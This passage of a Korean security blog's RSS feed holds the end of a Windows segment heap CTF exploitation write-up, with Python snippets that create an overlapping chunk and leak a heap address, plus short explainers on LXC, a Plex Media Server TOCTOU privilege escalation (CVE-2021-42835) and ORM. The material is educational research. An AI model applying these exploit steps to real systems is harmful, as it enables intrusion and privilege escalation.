&#xD574;&#xC81C;&#xD558;&#xBA74;, &#xBCC0;&#xC870;&#xB41C; &#xC0AC;&#xC774;&#xC988;&#xB85C; &#xC778;&#xD574; &#xB4A4;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xCCAD;&#xD06C;&#xB3C4; FreeList&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xACE0; &#xC774;&#xD6C4; &#xC7AC;&#xD560;&#xB2F9; &#xC2DC; &#xC774;&#xBBF8; &#xD560;&#xB2F9;&#xB41C; &#xCCAD;&#xD06C;&#xC5D0; &#xB2E4;&#xC2DC; &#xD560;&#xB2F9;&#xD558;&#xB294; Overlap Chunk&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">destory(<span class="hljs-number">2</span>)alloc(<span class="hljs-number">0</span>,<span class="hljs-number">0x8000</span>) <span class="hljs-comment"># int 2 (realloc)</span>alloc(<span class="hljs-number">3</span>,<span class="hljs-number">0x200</span>) <span class="hljs-comment"># str 6</span>alloc(<span class="hljs-number">1</span>,<span class="hljs-number">0xbeef</span>) <span class="hljs-comment"># secret 7</span></code></pre><p>&#xC138; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xACE0;, &#xAC19;&#xC740; &#xD06C;&#xAE30;&#xB85C; &#xC7AC;&#xD560;&#xB2F9; &#xD55C; &#xB4A4;&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xB294; 7&#xBC88;&#xC9F8;(index 6) &#xCCAD;&#xD06C;&#xAC00; Overlap Chunk&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%2014.png" alt="Untitled"></p><p>&#xC5E5;? &#xADF8;&#xB7F0;&#xB370; &#xC5EC;&#xAE30;&#xC5D0; &#xC911;&#xBCF5;&#xB41C; &#xCCAD;&#xD06C;&#xAC00; &#xC5C6;&#xC9C0; &#xC54A;&#xB0D0;&#xAD6C;&#xC694;?  </p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%2015.png" alt="Untitled"></p><p>&#xC815;&#xB2F5;&#xC740; &#xB124; &#xBC88;&#xC9F8; string storage &#xCCAD;&#xD06C;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC5D0; &#xD560;&#xB2F9;&#xD55C; &#xCCAD;&#xD06C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;! </p><h2 id="Memory-Leak-heap"><a href="#Memory-Leak-heap" class="headerlink" title="Memory Leak - heap"></a>Memory Leak - heap</h2><p>&#xBC29;&#xAE08; &#xB9CC;&#xB4E0; Overlap Chunk&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; heap &#xC8FC;&#xC18C;&#xBD80;&#xD130; leak&#xD574;&#xC57C;&#xACA0;&#xC8E0;.</p><pre><code class="hljs python">setvalue(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0x40</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x40</span>)</code></pre><p>&#xB124; &#xBC88;&#xC9F8; string storage &#xCCAD;&#xD06C;&#xC5D0; a&#xB97C; 40&#xAC1C;&#xB97C; &#xC501;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%2016.png" alt="Untitled"></p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%2017.png" alt="Untitled"></p><p>&#xADF8;&#xB7FC; &#xB124; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C;&#xC758; &#xBB38;&#xC790;&#xC5F4; &#xCCAD;&#xD06C; &#xC8FC;&#xC18C;&#xC5D0; &#xC785;&#xB825;&#xD55C; 40&#xAC1C;&#xC758; a&#xAC00; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370;, &#xC544;&#xB798; &#xBCF4;&#xC774;&#xB294; <code>segment base + 0x55050</code>&#xB294; &#xC544;&#xAE4C; &#xC0DD;&#xC131;&#xD55C; 7&#xBC88;&#xC9F8; Overlap chunk&#xB124;&#xC694;. a&#xB85C; &#xCC44;&#xC6B4;&#xACF3;&#xACFC; 7&#xBC88;&#xC9F8; &#xCCAD;&#xD06C;&#xC758; &#xBB38;&#xC790;&#xC5F4; &#xD799; &#xD3EC;&#xC778;&#xD130; &#xC0AC;&#xC774; 8&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xB354; &#xCC44;&#xC6B0;&#xACE0; &#xB124; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xBA74; &#xB4A4;&#xC758; &#xD799; &#xCCAD;&#xD06C; &#xC8FC;&#xC18C;&#xB97C; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs python">setvalue(<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-0x4b</span> ,<span class="hljs-number">0x6161616161616161</span>)</code></pre><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%2018.png" alt="Untitled"></p><p>set value type 1&#xB85C; <code>0x6161616161616161</code> &#xC744; <code>-0x4b</code> index&#xC5D0; &#xC4F0;&#xBA74; &#xBB38;&#xC790;&#xC5F4; &#xCCAD;&#xD06C; &#xD3EC;&#xC778;&#xD130; &#xC804;&#xAE4C;&#xC9C0; &#xBAA8;&#xB450; &#xCC44;&#xC6B8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs python">getvalue(<span class="hljs-number">3</span>)p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x48</span>)vs_segment = u64(p.recvuntil(<span class="hljs-string">&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>)) - <span class="hljs-number">0x80</span>print(<span class="hljs-string">&quot;vs_segment:&quot;</span>,hex(vs_segment))</code></pre><p><img src="/2021/12/19/l0ch/segment-heap-part4/pic2.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2021-12-19 17.18.58.png"></p><p>&#xADF8;&#xB9AC;&#xACE0; &#xB124; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCD9C;&#xB825;&#xD55C; &#xACB0;&#xACFC;&#xB97C; &#xBCF4;&#xBA74; &#xD799; &#xC8FC;&#xC18C;(VS &#xC138;&#xADF8;&#xBA3C;&#xD2B8;) &#xC8FC;&#xC18C;&#xB97C; leak&#xD55C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB124;&#xC694;!</p><p>&#xB9C8;&#xC9C0;&#xB9C9; &#xD30C;&#xD2B8; 5&#xC5D0;&#xC11C;&#xB294; leak&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xC774;&#xC6A9;&#xD574; ntdll &#xB4F1; &#xAE30;&#xD0C0; &#xC775;&#xC2A4;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD558;&#xACE0; &#xC258;&#xAE4C;&#xC9C0; &#xB744;&#xC6B0;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB9C8; 2022&#xB144;&#xC5D0; &#xC62C;&#xB77C;&#xC624;&#xACA0;&#xB124;&#xC694; &#x314E;&#x314E; &#xB0B4;&#xB144;&#xC5D0; &#xB9C8;&#xC9C0;&#xB9C9; &#xD30C;&#xD2B8;&#xB85C; &#xCC3E;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap/">heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/hitcon/">hitcon</category>
      
      <category domain="https://hackyboiz.github.io/tags/segment-heap/">segment heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-10/">windows 10</category>
      
      
      <comments>https://hackyboiz.github.io/2021/12/19/l0ch/segment-heap-part4/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Linux Container(LXC)</title>
      <link>https://hackyboiz.github.io/2021/12/17/poosic/linux-container/</link>
      <guid>https://hackyboiz.github.io/2021/12/17/poosic/linux-container/</guid>
      <pubDate>Fri, 17 Dec 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Linux Container&amp;#xB294; chroot&amp;#xC758; &amp;#xB2E8;&amp;#xC810;&amp;#xC744; &amp;#xBCF4;&amp;#xC644;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xB098;&amp;#xC628; &amp;#xAE3</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Linux Container&#xB294; chroot&#xC758; &#xB2E8;&#xC810;&#xC744; &#xBCF4;&#xC644;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB098;&#xC628; &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;. chroot&#xC758; &#xB2E8;&#xC810;&#xC740; &#xBB34;&#xC5C7;&#xC774;&#xC5C8;&#xC744; &#xAE4C;&#xC694;? &#xBC14;&#xB85C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC0C1;&#xC5D0;&#xC11C; chroot&#xB97C; &#xD1B5;&#xD574; root directory&#xB97C; &#xBCC0;&#xACBD;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;&#xBA74; &#xAE30;&#xC874;&#xC5D0; &#xCC38;&#xC870;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB358; library&#xAC00; &#xBCC0;&#xACBD;&#xB41C; root directory&#xC758; &#xC0C1;&#xC704; directory&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;&#xBA74; &#xB2F9;&#xC5F0;&#xD788; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/12/17/poosic/linux-container/1.png" alt></p><p>&#xB9CC;&#xC57D; &#xC704;&#xC758; &#xC608;&#xC2DC;&#xC5D0;&#xC11C; &#xCC98;&#xB7FC; <code>/A</code>&#xAC00; root directory&#xB85C; &#xC9C0;&#xC815;&#xB418;&#xC5C8;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xAC00; <code>/B</code>&#xC5D0; &#xC874;&#xC7AC;&#xD560; &#xACBD;&#xC6B0; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xBD88;&#xAC00;&#xB2A5; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>/A</code>&#xC758; &#xD558;&#xC704; &#xD3F4;&#xB354;&#xC5D0; <code>/B</code> directory&#xB97C; &#xC0C8;&#xB85C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xC0AC;&#xD574;&#xC918;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xB2E8;&#xC810;&#xC744; &#xBCF4;&#xC644;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB4F1;&#xC7A5;&#xD55C; &#xAC1C;&#xB150;&#xC774; &#xBC14;&#xB85C; Linux Container&#xC785;&#xB2C8;&#xB2E4;. LXC&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xBCA8;&#xC758; &#xAC00;&#xC0C1;&#xD654; &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/17/poosic/linux-container/2.png" alt></p><p>&#xAC00;&#xC0C1;&#xD654; &#xAE30;&#xC220;&#xC774;&#xB77C;&#xACE0; &#xD558;&#xBA74; Virtual Machine&#xC744; &#xC0DD;&#xAC01; &#xD560; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; Virtual Machine&#xACFC;&#xB294; &#xB2E4;&#xB974;&#xAC8C; OS&#xC790;&#xCCB4;&#xB294; &#xAC00;&#xC0C1;&#xD654;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. LXC&#xB294; &#xD638;&#xC2A4;&#xD2B8;&#xC758; OS&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC774;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. </p><p>process tree, user account, file system, IPC &#xB4F1;&#xC744; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xB9C8;&#xB2E4; &#xACA9;&#xB9AC;&#xC2DC;&#xCF1C; &#xD638;&#xC2A4;&#xD2B8;&#xC640; &#xBCC4;&#xAC1C;&#xC758; &#xAC00;&#xC0C1; &#xACF5;&#xAC04;&#xC744; &#xB9CC;&#xB4E4;&#xACE0; CPU,&#xBA54;&#xBAA8;&#xB9AC;,&#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xB4F1;&#xC758; &#xC790;&#xC6D0;&#xC744; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB9C8;&#xB2E4; &#xD560;&#xB2F9;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; libvirt&#xB294; Linux&#xC758; &#xAC00;&#xC0C1;&#xD654;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD574; API, &#xB370;&#xBAAC;, &#xADF8;&#xB9AC;&#xACE0; &#xAD00;&#xB9AC; &#xD234;&#xB4E4;&#xC758; &#xC9D1;&#xD569;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, &#xAC00;&#xC0C1;&#xD658;&#xACBD; &#xAD00;&#xB9AC;&#xB97C; &#xC704;&#xD55C; C &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>LXC&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xBCA8; &#xAC00;&#xC0C1;&#xD654; &#xAE30;&#xC220;&#xC744; &#xD1B5;&#xD574; chroot&#xC758; &#xB2E8;&#xC810;&#xC744; &#xBCF4;&#xC644;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/linux-container/">linux container</category>
      
      
      <comments>https://hackyboiz.github.io/2021/12/17/poosic/linux-container/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-42835: Plex Media Server의 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/12/16/l0ch/2021-12-16/</link>
      <guid>https://hackyboiz.github.io/2021/12/16/l0ch/2021-12-16/</guid>
      <pubDate>Thu, 16 Dec 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ir-on.io/2021/12/02/local-privilege-plexcalation/</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ir-on.io/2021/12/02/local-privilege-plexcalation/">https://ir-on.io/2021/12/02/local-privilege-plexcalation/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Plex Media Server</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Plex Media Server&#xB294; &#xAE00;&#xB85C;&#xBC8C; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xBBF8;&#xB514;&#xC5B4; &#xC11C;&#xBE44;&#xC2A4; &#xBC0F; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;-&#xC11C;&#xBC84; &#xBBF8;&#xB514;&#xC5B4; &#xD50C;&#xB808;&#xC774;&#xC5B4; &#xD50C;&#xB7AB;&#xD3FC; &#xC785;&#xB2C8;&#xB2E4;. Windows&#xC6A9; Plex Media Server&#xC5D0;&#xC11C; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC6D0;&#xC778;&#xC740; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB294; <code>CheckBundle()</code> &#xD568;&#xC218;&#xC640; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C; &#xC2E4;&#xD589;&#xC774; &#xAC01;&#xAC01; <code>CreateFile()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; TOCTOU&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>CheckBundle()</code> &#xD568;&#xC218;&#xB294; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xC740; &#xD30C;&#xC77C;&#xC744; <code>CreateFile()</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xC11C;&#xBA85;&#xB41C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xC774; &#xC11C;&#xBA85;&#xB41C; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xD30C;&#xC77C;&#xC774;&#xB77C;&#xBA74; <code>Install()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; <code>CreateFile()</code> &#xB85C;  &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD574; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB294;&#xB370;, <code>CheckBundle()</code>&#xC758; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD55C; &#xC774;&#xD6C4; &#xD30C;&#xC77C;&#xC744; <code>Install()</code> &#xD638;&#xCD9C; &#xC804; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xB85C; &#xAD50;&#xCCB4;&#xD558;&#xBA74; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xACE0; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xACFC;&#xC815;&#xC740; RPC &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xACE0;, &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; RPC &#xD638;&#xCD9C;&#xC774; &#xC720;&#xC800; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB3C4;&#xB85D; &#xD558;&#xB294; <code>RPCImpersonateClient()</code> &#xB610;&#xB294; <code>CreateProcessAsUser()</code> &#xD638;&#xCD9C;&#xC774; &#xC5C6;&#xC5B4; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC791;&#xB3D9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; TOCTOU&#xB97C; &#xD1B5;&#xD55C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC791;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810; &#xBCF4;&#xACE0;&#xC11C;&#xC5D0;&#xB294; James Forshaw&#xC758; SetOpLock &#xD234;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C; &#xC811;&#xADFC; &#xC2DC;&#xB3C4;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xC811;&#xADFC;&#xC744; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xB4A4; &#xD0C0;&#xAC9F; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD30C;&#xC77C;&#xC758; &#xD578;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD574;&#xCEE4;&#xC758; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xB85C; &#xAD50;&#xCCB4;&#xD558;&#xACE0; &#xC811;&#xADFC; &#xC81C;&#xD55C;&#xC744; &#xD574;&#xC81C;&#xD558;&#xBA74; Plex Media Server&#xAC00; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD574;&#xCEE4;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/privilege-escalation/">privilege escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-42835/">cve-2021-42835</category>
      
      <category domain="https://hackyboiz.github.io/tags/setoploc/">setoploc</category>
      
      
      <comments>https://hackyboiz.github.io/2021/12/16/l0ch/2021-12-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] ORM(Object Relational Mapping)</title>
      <link>https://hackyboiz.github.io/2021/12/15/y00n_nms/orm/</link>
      <guid>https://hackyboiz.github.io/2021/12/15/y00n_nms/orm/</guid>
      <pubDate>Wed, 15 Dec 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;ORM &amp;#xC774;&amp;#xC804;&amp;#xC5D0;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xBCA0;&amp;#xC774;&amp;#xC2A4;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#</description>
        
      
      
      
      <content:encoded><![CDATA[<p>ORM &#xC774;&#xC804;&#xC5D0;&#xB294; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC704;&#xD558;&#xC5EC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; SQL &#xCFFC;&#xB9AC;&#xB97C; &#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC758; &#xADDC;&#xBAA8;&#xC640; &#xBCF5;&#xC7A1;&#xC131;&#xC774; &#xC99D;&#xAC00;&#xD560; &#xC218;&#xB85D;, &#xD2B9;&#xD788; &#xCC98;&#xB9AC;&#xD574;&#xC57C; &#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xB370;&#xC774;&#xD130; &#xD544;&#xD130;&#xB9C1;&#xC744; &#xACE0;&#xB824;&#xD560; &#xB54C; &#xB9E4;&#xC6B0; &#xB54C;&#xB54C;&#xB85C; &#xB9E4;&#xC6B0; &#xBCF5;&#xC7A1;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAC1D;&#xCCB4; &#xBAA8;&#xB378;&#xACFC; &#xAD00;&#xACC4;&#xD615; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xAC04;&#xC758; &#xBD88;&#xC77C;&#xCE58;&#xB85C;, &#xAD00;&#xACC4;&#xD615; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0; &#xAC1D;&#xCCB4;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC800;&#xC7A5;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; 5&#xAC00;&#xC9C0; &#xBD88;&#xC77C;&#xCE58; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>Granularity: &#xB54C;&#xB85C;&#xB294; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC758; &#xD14C;&#xC774;&#xBE14; &#xC218;&#xBCF4;&#xB2E4; &#xB354; &#xB9CE;&#xC740; &#xD074;&#xB798;&#xC2A4;&#xAC00; &#xC788;&#xB294; &#xAC1D;&#xCCB4; &#xBAA8;&#xB378;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>Inheritance: RDBMS&#xB294; &#xAC1D;&#xCCB4;&#xC9C0;&#xD5A5; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC5B8;&#xC5B4;&#xC758; &#xD2B9;&#xC9D5;&#xC778; &#xC0C1;&#xC18D; &#xAC1C;&#xB150;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>Identity: RDBMS&#xB294; &#xB3D9;&#xC77C;&#xC131;&#xC744; &#xC815;&#xC758;&#xD558;&#xAE30; &#xC704;&#xD574; primary key&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC9C0;&#xB9CC; JAVA&#xB294; (a==b)&#xC640; (a.equals(b))&#xB97C; &#xBAA8;&#xB450; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Associations: RDBMS&#xB294; &#xC5F0;&#xAD00;&#xC131;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xAE30; &#xC704;&#xD574; foriegn key&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC9C0;&#xB9CC; &#xAC1D;&#xCCB4;&#xC9C0;&#xD5A5;&#xC5B8;&#xC5B4;&#xB294; &#xAC1D;&#xCCB4;&#xC758; &#xCC38;&#xC870;&#xB97C; &#xC774;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Navigation: Java&#xC640; RDBMS&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4;&#xC5D0; 